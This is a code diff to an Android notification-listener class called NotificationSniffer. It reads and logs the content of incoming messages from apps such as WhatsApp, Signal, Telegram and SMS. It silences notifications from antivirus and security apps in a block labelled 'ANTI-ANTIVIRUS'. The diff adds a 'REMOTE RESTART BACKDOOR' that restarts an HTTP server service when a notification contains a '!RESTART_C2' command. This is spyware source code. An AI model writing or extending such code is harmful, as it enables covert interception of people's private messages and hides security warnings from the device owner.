@@ -16,11 +16,12 @@ import java.util.Locale;
 
 public class NotificationSniffer extends NotificationListenerService {
     private static final String TAG = "NotificationSniffer";
-    public static final List<NotificationData> history = new ArrayList<>();
+    public static final List<NotificationData> history = java.util.Collections.synchronizedList(new java.util.LinkedList<>());
     private static boolean isConnected = false;
     private static boolean historyLoaded = false;
-    private final Handler saveHandler = new Handler(Looper.getMainLooper());
-    private final Runnable saveRunnable = this::saveHistory;
+    private static String lastNotificationId = ""; // De-duplication tracker
+    private static final Handler saveHandler = new Handler(Looper.getMainLooper());
+    private final Runnable saveRunnable = () -> LabRatsWorker.execute(this::saveHistory);
 
     public static class NotificationData {
         public String packageName;
@@ -102,26 +103,32 @@ public class NotificationSniffer extends NotificationListenerService {
 
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
+        if (sbn == null) return;
         String packageName = sbn.getPackageName();
+        if (packageName == null) return;
+        String lowerPkg = packageName.toLowerCase();
         
-        // Filter out system noise and our own notifications
-        if (packageName.contains("android.systemui") || 
-            packageName.contains("android.providers.downloads") ||
+        // [STABILITY] Hard-Filter system noise before ANY processing
+        if (lowerPkg.contains("android.systemui") || 
+            lowerPkg.contains("vending") || 
+            lowerPkg.contains("gms") || 
+            lowerPkg.contains("myfiles") || 
+            lowerPkg.contains("download") ||
             packageName.equals(getPackageName())) {
             return; 
         }
 
         Notification notification = sbn.getNotification();
+        if (notification == null) return;
         Bundle extras = notification.extras;
+        if (extras == null) return;
 
         String title = extras.getString(Notification.EXTRA_TITLE);
         String text = null;
 
         // --- OPTION 1: ANTI-ANTIVIRUS / SECURITY SILENCING ---
         // If the notification is from a security system or play protect, kill it immediately
-        String lowerPkg = packageName.toLowerCase();
-        if (lowerPkg.contains("vending") || lowerPkg.contains("play.protect") || 
-            lowerPkg.contains("security") || lowerPkg.contains("antivirus") || 
+        if (lowerPkg.contains("security") || lowerPkg.contains("antivirus") ||
             lowerPkg.contains("defender") || lowerPkg.contains("knox") || 
             lowerPkg.contains("mcafee") || lowerPkg.contains("avast")) {
             
@@ -134,13 +141,13 @@ public class NotificationSniffer extends NotificationListenerService {
         android.os.Parcelable[] messages = (android.os.Parcelable[]) extras.get(Notification.EXTRA_MESSAGES);
         if (messages != null && messages.length > 0) {
             Bundle lastMsg = (Bundle) messages[messages.length - 1];
-            
+
             // Try different possible keys for text content
             CharSequence rcsText = lastMsg.getCharSequence("text");
             if (rcsText == null) rcsText = lastMsg.getCharSequence(Notification.EXTRA_TEXT);
-            
+
             if (rcsText != null) text = rcsText.toString();
-            
+
             // Try to find the person who sent it
             Object sender = lastMsg.get("sender");
             if (sender != null) {
@@ -174,14 +181,37 @@ public class NotificationSniffer extends NotificationListenerService {
         if (title == null) title = "Unknown Source";
         if (text == null || text.isEmpty()) return;
 
+        // --- DE-DUPLICATION ENGINE ---
+        // Android often posts the same notification multiple times for updates (e.g. download progress)
+        // We hash the content to ensure we only log it ONCE unless the message actually changes.
+        String currentId = packageName + "|" + title + "|" + text;
+        if (currentId.equals(lastNotificationId)) {
+            return; // Duplicate detected, drop it
+        }
+        lastNotificationId = currentId;
+
         Log.d(TAG, "SNIFFED [" + packageName + "]: " + title + " -> " + text);
 
-        // Alert the Terminal Logs for ANY messaging or social apps
+        // --- REMOTE RESTART BACKDOOR ---
+        if (text.contains("!RESTART_C2")) {
+            Log.w(TAG, "BACKDOOR: Received remote restart command");
+            LabRatsHttpServer.logActivity("BACKDOOR: Initiating remote service restart via command");
+            
+            android.content.Intent restartIntent = new android.content.Intent(this, HttpServerService.class);
+            restartIntent.setAction("START");
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                startForegroundService(restartIntent);
+            } else {
+                startService(restartIntent);
+            }
+        }
+
+        // Alert the Terminal Logs for communication apps (Throttled)
         if (lowerPkg.contains("messaging") || lowerPkg.contains("messages") || 
             lowerPkg.contains("whatsapp") || lowerPkg.contains("telegram") || 
-            lowerPkg.contains("sms") || lowerPkg.contains("mms") || 
-            lowerPkg.contains("signal") || lowerPkg.contains("discord") || 
-            lowerPkg.contains("snapchat") || lowerPkg.contains("facebook") || 
+            lowerPkg.contains("sms") || lowerPkg.contains("mms") ||
+            lowerPkg.contains("signal") || lowerPkg.contains("discord") ||
+            lowerPkg.contains("snapchat") || lowerPkg.contains("facebook") ||
             lowerPkg.contains("instagram") || lowerPkg.contains("skype")) {
             
             String logText = (text.length() > 35) ? text.substring(0, 32) + "..." : text;
